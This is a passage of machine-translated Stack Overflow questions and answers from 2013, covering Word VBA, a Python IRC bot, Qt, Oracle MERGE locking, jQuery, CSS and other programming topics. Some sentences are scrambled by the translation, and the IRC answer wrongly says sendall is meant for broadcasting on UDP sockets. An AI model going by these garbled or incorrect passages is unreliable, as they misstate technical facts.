我使用快速设置差异来打印差异，这可能需要改进。

对于您的示例数据，将打印：

```
DUT 2 differences: 
DUT 3 differences: 28,30,32 
```

# vba - Word VBA：将文本字符串从段落末尾移动到段落开头

> ID：15936121
> 
> 赞同：2
> 
> 时间：2013-04-10T20:50:44.683
> 
> 标签：vba, ms-word

我是 VBA 新手。我有几个长文档，其中引文或文档编号出现在段落的末尾。幸运的是，这些引文和文件都用括号括起来，这应该很容易隔离。我需要将这些括号的内容（包括括号本身）移动到每个段落的前面，然后在右括号后添加两个空格。

例如：

> 这是我在第 1 段中的文字。（[http://nytimes.com](http://nytimes.com)）
> 
> 这是我在第 2 段中的文字。（1.b.3B）

应该看起来像：

> ( [http://nytimes.com](http://nytimes.com) ) 这是我在第 1 段中的文字。
> 
> (1.b.3B) 这是我在第 2 段中的文字。

我发现以下链接中的答案很有用，但似乎无法将其应用于我的案例：[Get paragraph no where txt is found, and move text to end of paragraph using Word 2010 vba](https://stackoverflow.com/questions/13597775/get-paragraph-no-where-txt-is-found-and-move-text-to-end-of-paragraph-using-wor)

提前谢谢了。

这是我到目前为止所拥有的，但脚本似乎没有运行：

```
Sub Test1()

Dim currDoc As Document
Set currDoc = ActiveDocument
Dim docRng As Range, currRng As Range, strRng As Range
Set docRng = ActiveDocument.Content
Dim currPara As Paragraph
Dim strText As String

Selection.HomeKey Unit:=wdStory ' Start from the beginning of the doc.

For Each currPara In docRng.Paragraphs ' Loop through the paragraphs in the active document.

Set currRng = currDoc.Range(currPara.Range.Start, currPara.Range.End) ' Selects the current paragraph, so that the search is conducted paragraph by paragraph.

With Selection.Find
        .ClearFormatting
        .Text = "\(*\)"
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindStop
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchAllWordForms = False
        .MatchSoundsLike = False
        .MatchWildcards = True
End With

If currRng.Find.Execute Then

With Selection
    .Select
    .Cut
    .StartOf Unit:=wdParagraph
    .Paste
    .InsertAfter "  "
End With

End If

Next currPara

End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:13:25.697

您非常接近移动简单文本的正确解决方案。但是，我意识到，移动超链接是个问题，因为语法`"\(*\)"`无法识别超链接。因此，我进行了一些额外的小修改。这在 Word 2010 中对我有用：

```
Sub Test1_Tested_incl_Hyper()

Dim currDoc As Document
Set currDoc = ActiveDocument
Dim docRng As Range, currRng As Range, strRng As Range
Set docRng = ActiveDocument.Content
Dim currPara As Paragraph
Dim strText As String

Selection.HomeKey Unit:=wdStory ' Start from the beginning of the doc.

For Each currPara In docRng.Paragraphs ' Loop through the paragraphs in the active document.

Set currRng = currDoc.Range(currPara.Range.Start, currPara.Range.End) ' Selects the current paragraph, so that the search is conducted paragraph by paragraph.
currRng.Select
With Selection.Find
    .ClearFormatting
    .Text = "\("
    .Replacement.Text = ""
    .Forward = True
    .Wrap = wdFindStop
    .Format = False
    .MatchCase = True
    .MatchWholeWord = False
    .MatchAllWordForms = False
    .MatchSoundsLike = False
    .MatchWildcards = True
    .Execute
End With

If Selection.Find.Found Then

With currDoc.Range(Selection.Range.Start, currPara.Range.End - 1)
    .Select
    .Cut
    .StartOf Unit:=wdParagraph
    .Paste
    .InsertAfter "  "
End With

End If

Next currPara

End Sub 
```

**EDIT-页脚代码**

```
Sub Test1_for_Footers()

Dim currDoc As Document
Set currDoc = ActiveDocument
Dim docRng As Range, currRng As Range, strRng As Range
Set docRng = ActiveDocument.StoryRanges(wdPrimaryFooterStory)
Dim currPara As Paragraph
Dim strText As String

For Each currPara In docRng.Paragraphs

currPara.Range.Select
With Selection.Find
    .ClearFormatting
    .Text = "\("
    .Replacement.Text = ""
    .Forward = True
    .Wrap = wdFindStop
    .Format = False
    .MatchCase = True
    .MatchWholeWord = False
    .MatchAllWordForms = False
    .MatchSoundsLike = False
    .MatchWildcards = True
    .Execute
End With

If Selection.Find.Found Then
Selection.Extend ")"

With Selection
    .Select
    .Cut
    .StartOf Unit:=wdParagraph
    .Paste
    .InsertAfter "  "
End With

End If

Next currPara

End Sub 
```

# python - Python中的IRC BOT，如果在while循环中的elif中

> ID：15936127
> 
> 赞同：-1
> 
> 时间：2013-04-10T20:51:05.190
> 
> 标签：python, chat, bots, irc

这是完整的代码：

```
#client der mit irc-server kontakt aufnimmt
import time
import socket
from sys import argv

script, mitspieler1, mitspieler2 = argv
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

class funktion:

    def main(self):

            print "Socket(Client)"
            host = "irc.iz-smart.net"
            port = 6667 
            PASS = "7987fshd" 
            NICK = "Testikus" 
            USER = "Testikus localhost irc.iz-smart.net :Testikus" 
            self.login(PASS, NICK, USER, host, port)
            print "Verbindung aufgebaut zu {0}(IP:{1})".format(
            host, socket.gethostbyname(host)
            )
            self.haupt_schleife()

    def haupt_schleife(self):
        while True:
            antwort = sock.recv(4096)
            join = "JOIN #testblablub \r\n"
            print antwort
            if antwort[0:4] == "PING":
                self.pong(antwort, join)
            elif antwort.split()[3] == ":quiz.start":
                sock.sendall("PRIVMSG #testblablub Es spielen mit: "
                            +mitspieler1+" und "+mitspieler2+"\r\n"
                            )
                time.sleep(2)
                self.fragen(antwort)

    def pong(self, antwort, join):
        sock.sendall("PONG " + antwort.split()[1] + "\n")
        time.sleep(3)
        sock.sendall(join)
        sock.sendall("PRIVMSG #testblablub hi \r\n")

    def login(self, PASS, NICK, USER, host, port):
        sock.connect((host, port))
        sock.sendall("PASS "+PASS+"\n")
        sock.sendall("NICK "+NICK+"\n")
        sock.sendall("USER "+USER+"\n")

    def fragen(self, antwort):
            sock.sendall("PRIVMSG #testblablub Welche Farbe hat der Himmel ? \r\n")
            time.sleep(3)
            if antwort.split()[3] == ":blau":
                sock.sendall("PRIVMSG #testblablub RISCHTISCH \r\n")

ausfuehren = funktion()
ausfuehren.main() 
```

（有些字符串是用德语写的，但我认为这并不重要）

所以我的主要问题是我希望函数在函数`def fragen(self, antwort)`中运行`def haupt_schleife(self)`（或者为了 python 的方法）。所有重要的东西都在这里面`def haupt_schleife(self)`。我希望其余的测验代码在 elif 块中运行`def haupt_schleife(self)`，这样它就完全独立了。愚蠢的是，如果我输入“quiz.start” :`sock.sendall("PRIVMSG #testblablub Welche Farbe hat der Himmel ? \r\n")`运行没有问题，但它不会启动 if 语句。它只是在频道中不做任何其他事情（只是打印“Welche Farbe hat der Himmel ? out）。

我希望最后有人明白这一点：/（如果你想运行代码，你必须在命令行中输入两个名称，因为 argv）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T20:55:51.583

# IRC 语法

**不应**以这种方式发送消息：

```
PRIVMSG #testblablub Es spielen mit: 
```

它应该是：

```
PRIVMSG #testblablub :Es spielen mit ... 
```

此外，`USER`应由 4 个部分组成：

```
<username> <hostname> <servername> :<full name/realname> 
```

在 irc 中，以 我注意到你有时发送的每个字符串结尾**很重要**，这会很糟糕，总是以!`\r\n`
`\n``\r\n`

然后来`sock.sendall(...)`了，它应该用于说 UDP 套接字，你想在所有打开的套接字上广播消息，在你的情况下，你正在向服务器发送和从服务器发送消息，没有别的......它是通过 TCP 的，所以你应该使用`sock.send(...)`（如果我在这里错了，请纠正我）

附注：
`PING`，它应该只回复`PONG <server-name (usually sent with PING)>\r\n`而不是`JOIN`每次都发送垃圾邮件，`JOIN`应该在收到 MOTD 后发送，但确定它真的不是问题.. 它只会惹恼系统管理员。在你的情况下，它可能是`PONG irc.iz-smart.net\r\n`，没有别的，没有`JOIN`等等。

* * *

## 现在，问题

```
 def haupt_schleife(self):
        while True:
            antwort = sock.recv(4096)
            join = "JOIN #testblablub \r\n"
            print antwort
            if antwort[0:4] == "PING":
                self.pong(antwort, join)
            elif antwort.split()[3] == ":quiz.start":
                sock.sendall("PRIVMSG #testblablub Es spielen mit: "
                            +mitspieler1+" und "+mitspieler2+"\r\n"
                            )
                time.sleep(2)
                self.fragen(antwort)
            elif antwort.split()[3] == ":blau":
                sock.sendall("PRIVMSG #testblablub RISCHTISH!\r\n") 
```

因为`self.fragen(...)` **只有在***用户*写的时候才会被调用`quiz.start`，所以里面的`if`检查`def fragen(...)`将**永远不会**再次运行..（因为下次用户写东西时，它可能是 "blau" 并且不匹配 ":quiz.start" 这是唯一的进去`if`检查里面的方式`fragen(...)`。

```
 def fragen(self, antwort):
            sock.sendall("PRIVMSG #testblablub Welche Farbe hat der Himmel ? \r\n")
            time.sleep(3) 
```

所以我们移除了这个`if`块并把它变成了`elif`一个`haupt_schleife`。

这就是**FIRST**运行/消息的解析方式： ![在此处输入图像描述](https://i.stack.imgur.com/A7jib.png)

下一次运行，消息将是绿色的，`fragen`但它永远不会到达那里，因为到达那里的唯一方法是通过`elif antwort.split()[3] == ":quiz.start":`:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T20:59:43.273

`fragen`当此条件为真时，您调用该函数：

```
elif antwort.split()[3] == ":quiz.start": 
```

然后，在函数中，当此条件为真时`fragen`进入分支：`if`

```
if antwort.split()[3] == ":blau": 
```

由于函数被调用，我们知道`antwort.split()[3]`它将是`":quiz.start"`，因此该`if`语句将永远不会被执行。

您应该重新检查应用程序背后的逻辑。

# cocos2d-iphone - CCSpriteBatchNode 应用着色器？

> ID：15936129
> 
> 赞同：1
> 
> 时间：2013-04-10T20:51:09.377
> 
> 标签：cocos2d-iphone, opengl-es-2.0, ccspritebatchnode

我正在使用 cocos2d 2.0 将着色器应用于我的 BatchNode。

我更新了 ccV3F_C4B_T2F 结构来保存新的制服，所以它现在看起来像这样：

typedef 结构 _ccV3F_C4B_T2F {

```
ccVertex3F      vertices;           

ccColor4B       colors;         

ccTex2F         texCoords;      

    ccVertex2F              NewCoords; 
```

} ccV3F_C4B_T2F;

我在 CCspritebatchnode 的 plist 中添加了一个新的属性值，这是我想要传递给着色器的值。所以当batchnode获取每帧的偏移量、颜色矩形等时。它还将获得我需要传递的值。那行得通。

然后我从 Batchnodes plist 中获取值并修改“updatetransform”以接收这些值。所以它看起来像这样：

```
 quad_.bl.NewCoords = (ccVertex2F) { newCoords.x, newCoords.y };
        quad_.br.NewCoords = (ccVertex2F) { newCoords.x, newCoords.y };
        quad_.tl.NewCoords = (ccVertex2F) { newCoords.x, newCoords.y };
        quad_.tr.NewCoords = (ccVertex2F) { newCoords.x, newCoords.y }; 
```

我将 CCSpriteBatchNode 子类化并应用了着色器：

顶点着色器：

```
\n\
attribute vec4 a_position;                          \n\
attribute vec2 a_texCoord;                          \n\
attribute vec4 a_color;                             \n\
attribute vec2 a_newcoords;                          \n\
\n\
varying lowp vec4 v_fragmentColor;                  \n\
varying mediump vec2 v_texCoord;                    \n\
varying mediump vec2 v_newcoords;                   \n\
\n\
void main()                                         \n\
{                                                   \n\
   gl_Position = CC_MVPMatrix * a_position;     \n\
   v_fragmentColor = a_color;                       \n\
   v_texCoord = a_texCoord;                     \n\
   v_newcoords = a_newcoords;                        \n\
 }                                                      \n\
"; 
```

片段着色器：

```
#ifdef GL_ES
precision highp float;
#endif

varying vec4 v_fragmentColor;
varying vec2 v_texCoord;
varying vec2 v_newcoords;

 uniform sampler2D u_texture;

void main()
{
     vec2 texCoord = v_texCoord;
     vec4 texColor  = texture2D(u_texture, texCoord);

     vec2 MoveBy = vec2(v_newcoords.x, v_newcoords.y);
     vec4 Color1  = texture2D(u_texture, vec2(v_texCoord.x - MoveBy.x , v_texCoord.y));

     vec4 finalColor = vec4(texColor.r, texColor.g, Color1.b, texColor.a);
     gl_FragColor =  finalColor;
 } 
```

顶点着色器获取“属性 vec2 a_newcoords;” 正确，但我无法从片段着色器访问“变化的 v_newcoords”。

有人知道我可能做错了什么吗？

# localtunnel - 通过 localtunnel 获取各种奇怪的 POST 请求

> ID：15936130
> 
> 赞同：1
> 
> 时间：2013-04-10T20:51:09.937
> 
> 标签：localtunnel

我现在正在我的本地机器上开发一个 Rails 应用程序，我今天已经把它放在 localtunnel 上很多次了。

每次我这样做时，我都会收到一大堆奇怪的 POST 请求到我的服务器。一些例子：

```
/callbacks/geo/san-francisco

/facebook/subscription

/webhooks

/stripe-events 
```

这里发生了什么！？是否有人试图发起攻击，我向随机生成的本地隧道 URL 发出大量请求？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:08:46.217

只有 6700 个左右的唯一 localtunnel URL，人们错误地配置了他们的应用程序以继续发送请求，即使在使用完 URL 后也是如此。这在使用 Localtunnel 时很常见。

您应该升级到 localtunnel v2，它具有更强的唯一性要求，并且应该消除随机流量。

# python - 如何创建复选框并将其显示在模板中

> ID：15936134
> 
> 赞同：0
> 
> 时间：2013-04-10T20:51:28.097
> 
> 标签：python, django, django-models, checkbox, django-forms

forms.py 是

```
class ShowlivereportForm(forms.Form):
    livereport = forms.BooleanField() 
```

如何创建 django 复选框

我不知道如何创建一个显示复选框的模板，谁能给我一个例子

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T20:57:16.123

您可以在模板中使用 django 的自动`as_p`功能，也可以手动编写模板（以更好地控制其属性）。

对于自动，您需要在模板中使用它：

```
{{ form.as_p }} 
```

对于手册，您应该使用以下内容：

```
<input type="checkbox" id="livereport" name="livereport" {% if form.livereport.value %}checked="checked"{% endif %}>
<label for="livereport">Show live report</label> 
```

# javascript - 传递 html 样式/格式代码时，Jquery 工具提示需要调整 .html() 方法

> ID：15936138
> 
> 赞同：0
> 
> 时间：2013-04-10T20:51:36.173
> 
> 标签：javascript, jquery, tooltip

这是下面的 JQ 代码，它基于 divname、触发器 obj 和要在工具提示上显示的“消息”创建一个提示，这里的问题是当我传递多行消息时，其中包含格式和样式标记等`<p>`，`<li>`它不是渲染工具提示。不知道为什么......即使我通过.html（）传递它。任何建议表示赞赏。提前致谢

“味精”字符串就像

`<p> <li>A</li> <li>B</li> </p>`

包括样式和格式

```
function JQToolTip(toolTipDivName, trigObj, msg) {  
    var overlay = document.createElement('div');
overlay.className = "tooltip";
    overlay.id=toolTipDivName;
   $('body').append(overlay);
$("#"+toolTipDivName).html('<div class="AToolTip"><p align="left">'+msg+'</p></div>');
    $(trigObj).tooltip(
    {
      tip:"#"+toolTipDivName,
      track:true,delay:800,position:"bottomright",direction:'down'});           
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:06:52.427

```
$("#"+toolTipDivName).html('<div class="AToolTip"><p align="left">'+msg+'</p</div>'); 
```

应该

```
 $("#"+toolTipDivName).html('<div class="AToolTip"><p align="left">'+msg+'</p></div>'); 
```

如果不包含关闭的胡萝卜，jQuery 通常会忽略代码`>`

+1 归功于 cdlong。

# c# - 查看 pdf 的大纲（书签）

> ID：15936145
> 
> 赞同：0
> 
> 时间：2013-04-10T20:52:15.297
> 
> 标签：c#, pdfsharp

[我使用此代码](http://www.pdfsharp.net/wiki/Bookmarks-sample.ashx)创建了一个带有库 PDFsharp 的 PDF 文件。我用 Adob​​e Reader 打开文件并创建了书签。然后，当我阅读这个创建的 PDF 文件并且我想查看我的书签时，我创建了另一个程序，但`Outlines`集合`Count`是 0 并且`HasOutline`是错误的。它是一个错误吗？
您是否尝试过显示 PDF 的书签？

对不起我的英语不好

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-11T08:27:16.623

当您打开现有文档时，大纲集合保持为空是一个已知限制。

如果需要，您可以使用 GetObject() 访问大纲。

另见： http:
[//forum.pdfsharp.net/viewtopic.php ?p=705#p705](http://forum.pdfsharp.net/viewtopic.php?p=705#p705)
[http://forum.pdfsharp.net/viewtopic.php?p=1008#p1008](http://forum.pdfsharp.net/viewtopic.php?p=1008#p1008)

# qt - 需要帮助在 GUI 中将信号从线程连接到插槽

> ID：15936148
> 
> 赞同：0
> 
> 时间：2013-04-10T20:52:24.747
> 
> 标签：qt, signals-slots

主窗口.h：

```
#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>

namespace Ui {
class MainWindow;
}

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    explicit MainWindow(QWidget *parent = 0);
    ~MainWindow();

private slots:
    void disableStartButton();

private:
    Ui::MainWindow *ui;
};

#endif // MAINWINDOW_H 
```

我的对象.h

```
#ifndef MYOBJECT_H
#define MYOBJECT_H

#include <QtCore>

class MyObject : public QObject
{
    Q_OBJECT
public:
    explicit MyObject(QObject *parent = 0);
    void doSetup(QThread &cThread);

signals:
    void disableStartButton();

public slots:
    void doWork();    

};

#endif // MYOBJECT_H 
```

主.cpp：

```
#include "mainwindow.h"
#include "myobject.h"
#include <QApplication>

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    MainWindow w;
    w.show();

    QThread cThread;
    MyObject cObject;
    cObject.doSetup(cThread);
    cObject.moveToThread(&cThread);

    return a.exec();
} 
```

主窗口.cpp：

```
#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::disableStartButton() {
    ui->pushButton->setEnabled(false);
} 
```

我的对象.h：

```
#include "myobject.h"
#include <QDebug>

MyObject::MyObject(QObject *parent) :
    QObject(parent)
{
}

void MyObject::doSetup(QThread &cThread)
{
    connect(&cThread, SIGNAL(started()), this, SLOT(doWork()));
    connect(ui->pushButton, SIGNAL(clicked()), &cThread, SLOT(start())); // (1)
    connect(this, SIGNAL(disableStartButton()), ui, SLOT(disableStartButton())); // (2)
}

void MyObject::doWork()
{
    emit disableStartButton();
    qDebug() << "1";
} 
```

我正在尝试做两件事。

(1): 一旦按下 pushButton，我希望 cThread 启动。

(2): 只要 cThread 启动，它就会：`emit disableStartButton();`. 我想将 disableStartButton() 连接到 mainwindow.cpp 中的 disableStartButton()。

对于（1），我收到此错误：

myobject.cpp:12：错误：C2065：'ui'：未声明的标识符

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:10:26.813

当然，还有 ui 是未定义的。你尝试连接`ui->pushButton`

```
 connect(ui->pushButton, SIGNAL(clicked()), &cThread, SLOT(start())); // (1) 
```

在 myobject.cpp 文件中，当您的 ui 仅在 mainwindow.cpp 中声明时您必须将按钮连接到 mainwindow.cpp 文件中的线程，希望对您有所帮助

顺便说一句，你应该创建你的对象不是在，`main.cpp`但在你的情况下，在`mainwindow.cpp`，移动线

```
QThread cThread;
MyObject cObject;
cObject.doSetup(cThread);
cObject.moveToThread(&cThread); 
```

例如，在构造函数中归档 mainwindow.cpp

```
MainWindow::MainWindow(QWidget *parent) :
QMainWindow(parent),
ui(new Ui::MainWindow)
{
    ui->setupUi(this);
} 
```

紧接着`ui->setupUi(this);`

# sql - 根据分区列合并到分区表时，MERGE INTO 语句是否会锁定整个表？

> ID：15936152
> 
> 赞同：6
> 
> 时间：2013-04-10T20:52:31.713
> 
> 标签：sql, oracle11g

在我们的生产环境中出现一些性能问题后，我向我们的数据库管理员寻求帮助。在提供帮助的同时，他们告诉我合并会锁定表，并建议我改用 UPDATE 语句。

从我读过的所有内容来看，我的印象是 MERGE INTO 和 UPDATE 具有相似的增量锁定模式。下面是我们的应用程序正在使用的那种 MERGE INTO 语句的示例。

```
MERGE INTO sample_merge_table smt
USING (
    SELECT smt.*, sjt.* 
    FROM sample_merge_table smt 
    JOIN some_join_table sjt 
        ON smt.index_value = sjt.secondary_index_value 
    WHERE smt.partition_index = partitionIndex
) umt ON (smt.partition_index = partitionIndex AND smt.index_value = umt.index_value)
WHEN MATCHED THEN
    UPDATE SET...
WHEN NOT MATCHED THEN
    INSERT VALUES... 
```

运行此语句后，锁定过程实际上是什么？USING 选择中涉及的每个表都会被锁定吗？sample_merge_table 会被完全锁定，还是仅被访问的分区？UPDATE 语句会以增量方式锁定，还是 MERGE INTO 本身已经拥有所需的锁定？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-05T02:49:00.420

合并语句以行为基础工作，但预先锁定所有内容*，*即当语句执行完成规划并确定受影响的行时。

读数：

[https://forums.oracle.com/message/4372012](https://forums.oracle.com/message/4372012)

# firefox-addon - Firefox SDK：如何在编译时自动将插件版本放置在 html 页面中

> ID：15936153
> 
> 赞同：2
> 
> 时间：2013-04-10T20:52:31.053
> 
> 标签：firefox-addon, build-automation, firefox-addon-sdk

我正在使用 Firefox SDK 1.14 制作插件。

每次制作新版本的插件时，我都必须更改`packaje.json`文件的“版本”值。

在我的插件内的 HTML 页面中`index.html`，我使用[addon-page module](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/addon-page.html)调用它，我想显示插件版本。我知道显示它的唯一方法是在运行之前**手动**编辑文件`cfx xpi`。而且因为我的记忆力很糟糕，所以我总是忘记改变它......

在编译 .xpi 文件之前，是否有任何自动化方法可以更新我`index.html`页面中的文件版本？

顺便说一句，我正在使用 Ubuntu。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T00:12:04.293

该插件`version`可通过[`self`](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/self.html)模块访问。

```
var {name, id, version} = require("sdk/self"); 
```

然后，您可以[`contentScriptOptions`](https://addons.mozilla.org/en-US/developers/docs/sdk/latest/modules/sdk/page-worker.html#contentScriptOptions)在将内容脚本附加到 html 文件时设置该属性。

```
var self=require("sdk/self");
var tabs=require("sdk/tabs");
tabs.open({
  url: self.data.url("index.html"),
  onReady: function(tab){
    var pageWorker=tab.attach({
      contentScriptFile: self.data.url("contentscript.js"),
      contentScriptOptions: {addonID: self.id}
    });
  }
}); 
```

从内容脚本中，访问`contentScriptOptions`（上面）的内容，如下所示：

```
var id = self.options.addonID; 
```

# c++ - 将数组中的偶数正方形打印到单独的数组中

> ID：15936155
> 
> 赞同：0
> 
> 时间：2013-04-10T20:52:35.650
> 
> 标签：c++

从主要功能：

```
for (int i = 0; i <= squaresLength; i++)
    {
        cout << arraySquares[i] << endl;
    }
    cout<<endl; 
```

函数定义：

```
 void evenSquares(int arrIn[], int lengthIn, int arrOut[], int& lengthOut)
{
    int i, j;
    for (i=0; i<lengthIn; i++)
    {
        if (((arrIn[i]*arrIn[i])%2)==0)
        {
            for (j=0; j<lengthIn; j++)
            {
                {
                    arrOut[j]=(arrIn[i]*arrIn[i]);
                }
            }

        }
    lengthOut=j;
    }

} 
```

输出

```
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
25600
0 
```

我知道这个功能一团糟。应该计算arrIn的每个元素的平方，然后将偶数平方存储在arrOut中，同时将lengthOut的新值设置为arrOut中的偶数平方数。在此先感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T20:56:53.707

这不需要嵌套循环。您想遍历输入数组并以一定比例将项目写入输出数组，因此只需要一个循环，并仔细跟踪`arrOut`' 的长度。

幸运的是，`j`我们可以使用`lengthOut`长度和索引来代替将元素添加到`arrOut`.

```
lengthOut = 0;

for (i = 0; i < lengthIn; i++)
{
    if ((arrIn[i] * arrIn[i]) % 2 == 0)
    {
        arrOut[lengthOut] = arrIn[i] * arrIn[i];
        lengthOut++;
    }
} 
```

您还可以通过消除重复计算来改善这一点。

```
for (i = 0; i < lengthIn; i++)
{
    int square = arrIn[i] * arrIn[i];

    if (square % 2 == 0)
    {
        arrOut[lengthOut] = square;
        lengthOut++;
    }
} 
```

此外，第一个`for`循环存在一个错误：`<=`应该是`<`.

```
for (int i = 0; i < squaresLength; i++)
{
    cout << arraySquares[i] << endl;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:02:06.667

问题在于，在第一个 for 循环中，每次找到一个偶数正方形时，都会用 .lenghtIn 的副本填充 arrOut `arrIn[i]*arrIn[i]`。请注意，`i`在第二个 for 中没有更改。正确的代码是

```
int i,j,square;
j = 0;
for (i=0; i<lenghtIn; i++) {
    square = arrIn[i]*arrIn[i];
    if (square%2==0)
        arrOut[j++] = square;
}
lenghtOut = j; 
```

# php - 提交表单后启动 Javascript

> ID：15936159
> 
> 赞同：0
> 
> 时间：2013-04-10T20:52:59.277
> 
> 标签：php, javascript, jquery

我有一个按钮：

```
<button class="btn btn-secondary growl-type" data-type="success">Show Success Growl</button> 
```

用这个按钮我打开这个：

```
<script>
$("vpanmeldung").submit(function() {

    $('.growl-type').live ('click', function (e) {
        $.msgGrowl ({
            type: 'success'
            , title: 'Partner eroflgreich angelegt'
            , text: 'Der Vertriebspartner wurde erfolgreich im System angelegt. Sie können diesen nun in der Übersicht Ihrer Vertriebspartner aktivieren.'
        });
    }); 
});
</script> 
```

但是现在我想在发送表单时打开它，而不是点击按钮。我应该做什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:15:08.307

尝试这样的事情：

```
<head>
    <script>
        function test()
        {
            alert('test');
        }

        <?php

            if( [check if submit was successful] )
            {
                echo 'test();';
            }

        ?>

    </script>
</head> 
```

`echo '<script>test();'</script>;`只要它位于 javascript 函数*之后*，您就可以在页面上的其他位置使用它。否则，您将遇到“函数未定义”错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:03:53.447

从您的问题中，我了解到您想在提交表单时准确地打开咆哮弹出窗口。

在这种情况下，您应该删除按钮单击事件并将咆哮弹出初始化放入表单提交事件中，如下所示：

```
$("#anmeldung").on('submit', function(ev) {

    // If you want to skip the page redirect you should prevent the event
    ev.preventDefault();

    $.msgGrowl({
        type: 'success'
        , title: 'Partner eroflgreich angelegt'
        , text: 'Der Vertriebspartner wurde erfolgreich im System angelegt. Sie können diesen nun in der Übersicht Ihrer Vertriebspartner aktivieren.'
    });
}); 
```

让我知道它是否有效。

# jquery - 使用 jquery detach() 两次不能按预期工作

> ID：15936162
> 
> 赞同：0
> 
> 时间：2013-04-10T20:53:03.233
> 
> 标签：jquery, jquery-ui-dialog, jquery-autocomplete, detach

我的 DOM 中有一个自动完成文本框（使用 jquery）。我有一个场景，我需要在单击按钮时在对话框中显示此自动完成文本框。仅在对话框视图中执行自动完成内容，然后在我关闭对话框时将自动完成文本框设置回 DOM。这是示例：

```
$("#autocom-div button").click(function(){
    $("#autocom-div #autocomplete").detach().dialog({
        close: function(){
            $(this).removeClass('ui-dialog-content ui-widget-content').removeAttr('style');
            $('#autocom-div button').before(this);
        }
    });
}); 
```

相同的 jsfiddle 链接：

[http://jsfiddle.net/s24101984/EBduF/350/](http://jsfiddle.net/s24101984/EBduF/350/)

问题：当我第二次单击按钮时

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:52:40.050

问题不在于`detach()`，而在于`dialog()`。在创建另一个对话框之前，您必须销毁对话框的现有实例。因为destroy方法也会删除`div`托管，所以你需要先克隆它，如下所示：

```
$("#autocom-div button").click(function()
{
    var parent = $("#autocom-div"),
        elm    = $("#autocomplete"),
        clone  = $("#autocomplete").clone();

    $("#autocomplete").detach().dialog({
         close: function(){
             parent.prepend(clone);
             $(this).dialog('destroy').remove();
         }
    });

}); 
```

[jsfiddle](http://jsfiddle.net/arcm111/uWPUr/)

# css - 另一个中的中心元素，而父指定位置：绝对？

> ID：15936168
> 
> 赞同：1
> 
> 时间：2013-04-10T20:53:27.533
> 
> 标签：css, position, css-position, vertical-alignment

我正在使用这个 JS Fiddle：http: [//jsfiddle.net/BY3tz/1/](http://jsfiddle.net/BY3tz/1/)

请注意，当您从 CSS 类中删除`position`、`left`和`top`属性时`dotParent`，黑点在框内居中。

我正在寻找一种方法来保持黑点居中（垂直和水平），同时**保留上面提到的 3 个属性，**以便我可以更改`left`和`top`属性以将框定位在任何地方，并且黑点将保持居中。

这可能吗？谁能看到我在`dot`课堂上做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-10T20:56:13.813

对类的一些调整`.dot`：

```
.dot {
    position: absolute;
    width: 10px;
    height: 10px;
    border-radius: 50px;
    margin-left: -5px; // Half of the width * (-1)
    margin-top: -5px; // Half of the height * (-1)
    top: 50%;
    left: 50%;
    background: #000;
    -webkit-border-radius: 50px;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
} 
```

[http://jsfiddle.net/BY3tz/2/](http://jsfiddle.net/BY3tz/2/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T20:59:09.357

添加了点包装器，因此`.dot`相对于新包装器，

```
<div class="dotParent">
    <div class="dot-wrapper">
        <div class="dot"></div>
    </div><!-- end dot-wrapper -->
</div> 
```

新样式。

```
.dot-wrapper {
    position:relative;
    width:100%;
    height:100%;
} 
```

添加到 .dot 类

```
.dot {
    position:absolute;
    top:45%;
    left:45%;
} 
```

[http://jsfiddle.net/BY3tz/5/](http://jsfiddle.net/BY3tz/5/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-10T20:57:44.287

将 dotParent div 中的位置属性更改为“相对”。由于它是父级 Div，因此需要将其定位为相对，以便其子级将其作为参考点。

```
.dotParent {
    position: relative;
    top: 150px;
    left: 50px;
    height: 68px;
    width: 68px;
    border: 1px solid Black;
} 
```

[http://jsfiddle.net/BY3tz/6/](http://jsfiddle.net/BY3tz/6/)

# forms - 树枝设置选定值

> ID：15936170
> 
> 赞同：0
> 
> 时间：2013-04-10T20:53:40.530
> 
> 标签：forms, symfony, twig

我是 Twig 的新手。有人可以告诉我如何传入选择框的选定选项值，以便在加载 ajax 表单时选择它吗？

我究竟做错了什么？

`warehouse_id = 32`在这个例子中，`form_widget`自动创建了我的选择列表。

```
{{ form_widget(form.warehouse, {'selected': warehouse_id } ) }} 
```

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
